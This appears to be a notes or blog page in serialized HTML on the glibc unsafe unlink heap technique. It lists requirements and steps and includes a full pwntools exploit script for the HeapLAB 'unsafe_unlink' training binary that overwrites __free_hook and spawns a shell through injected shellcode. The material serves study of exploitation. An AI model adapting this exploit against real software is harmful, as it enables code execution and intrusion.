I"j.<p>Exploiting free on a corrupted chunk to get arbitrary write. Unsafe unlinking process will result in a reflected arbitrary 8-byte write anywhere.</p>

<h2 id="requirements">Requirements</h2>
<ul>
  <li>Allocate chunks in the unsorted bin, <code class="language-plaintext highlighter-rouge">120 - 1000 bytes</code></li>
  <li>Ability to corrupt <code class="language-plaintext highlighter-rouge">prev_size</code> and <code class="language-plaintext highlighter-rouge">prev_in_use</code> flag of a chunk, usually through heap overflow</li>
  <li>Ability to forge a fake freed chunk by writing valid <code class="language-plaintext highlighter-rouge">fd</code> and <code class="language-plaintext highlighter-rouge">bk</code> pointers in a chunk’s data
    <ul>
      <li><code class="language-plaintext highlighter-rouge">fd</code> and <code class="language-plaintext highlighter-rouge">bk</code> must both be writable addresses, such as GOT</li>
    </ul>
  </li>
</ul>

<h2 id="process">Process</h2>
<h3 id="arbitrary-write-primitive">Arbitrary Write Primitive</h3>
<p><em>Assuming <code class="language-plaintext highlighter-rouge">target</code> is the address to be overwritten</em></p>
<ul>
  <li>Allocate 2 chunks in the unsorted bin</li>
  <li>In the fake free chunk:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">fd (first 8 bytes in chunk data)</code> contains <code class="language-plaintext highlighter-rouge">target</code></li>
      <li><code class="language-plaintext highlighter-rouge">bk (next 8 bytes in chunk data)</code> contains 8-bytes to be written to <code class="language-plaintext highlighter-rouge">target</code></li>
    </ul>
  </li>
  <li>In the corrupted chunk:
    <ul>
      <li>Overwrite <code class="language-plaintext highlighter-rouge">prev_size</code> to be the size of the previous fake free chunk</li>
      <li>Overwite <code class="language-plaintext highlighter-rouge">prev_in_use</code> to be 0, <code class="language-plaintext highlighter-rouge">size</code> of chunk <code class="language-plaintext highlighter-rouge">0x91 -&gt; 0x90</code></li>
    </ul>
  </li>
  <li>Free the corrupted chunk
    <ul>
      <li><code class="language-plaintext highlighter-rouge">bk</code> will contain <code class="language-plaintext highlighter-rouge">fd</code>, vice versa</li>
    </ul>
  </li>
</ul>

<h2 id="example-heaplab-unsafe_unlink">Example: HeapLAB unsafe_unlink</h2>
<p><em>chunk A: fake free chunk, chunk B: corrupted chunk</em><br />
RCE is gained by writing address of chunk A’s data to <code class="language-plaintext highlighter-rouge">__free_hook</code>, and writing shellcode in chunk A’s data as <code class="language-plaintext highlighter-rouge">NX</code> is not set.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">config</span> <span class="o">=</span> <span class="p">{</span><span class="s">"elf"</span> <span class="p">:</span> <span class="s">"./unsafe_unlink"</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'size: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'data: '</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
    <span class="c1"># Get puts and heap leak
</span>    <span class="n">ru</span><span class="p">(</span><span class="s">'puts() @ '</span><span class="p">)</span>
    <span class="n">puts</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s">'heap @ '</span><span class="p">)</span>
    <span class="n">heap_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
    
    <span class="c1"># Calculate libc addresses
</span>    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
    <span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span>

    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
    
    <span class="c1"># In chunk A: Forge fake free chunk by faking fd and bk
</span>    <span class="c1"># In chunk B: Overwrite prev_size and prev_in_use to make the heap think A is freed
</span>    <span class="n">fd</span> <span class="o">=</span> <span class="n">free_hook</span> <span class="o">-</span> <span class="mi">24</span>
    <span class="n">bk</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">+</span> <span class="mh">0x10</span>
    <span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x90</span>
    <span class="n">size</span> <span class="o">=</span> <span class="mh">0x90</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">112</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">prev_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

    <span class="c1"># Free chunk B, heap will try to consolidate A and B with unlinking
</span>    <span class="c1"># Overwrite fd with bk, bk with fd due to unsafe unlinking
</span>    <span class="c1"># __free_hook now points to data of chunk A
</span>    <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="c1"># Write shellcode into data of chunk A
</span>    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>

    <span class="c1"># Pop shell using free() and __free_hook
</span>    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    
    <span class="n">lg</span><span class="p">(</span><span class="s">'heap_addr: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">))</span>

    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">])</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
    <span class="n">pause</span><span class="p">()</span>

    <span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
    <span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

    <span class="n">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</code></pre></div></div>
:ET